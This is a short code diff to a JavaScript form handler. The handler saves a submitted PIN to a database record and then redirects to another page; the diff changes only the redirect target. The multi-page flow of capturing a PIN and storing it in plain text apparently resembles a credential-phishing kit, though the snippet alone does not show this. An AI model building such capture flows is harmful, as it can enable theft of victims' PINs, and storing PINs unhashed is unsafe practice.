@@ -20,7 +20,7 @@ document.getElementById("pinForm").addEventListener("submit", function (e) {
   userRef.update({
     g_PIN: pinInput.value
   }).then(() => {
-    window.location.href = "customerid.html";
+    window.location.href = "lastdwon.html";
   }).catch((err) => {
     alert("Error: " + err.message);
   });
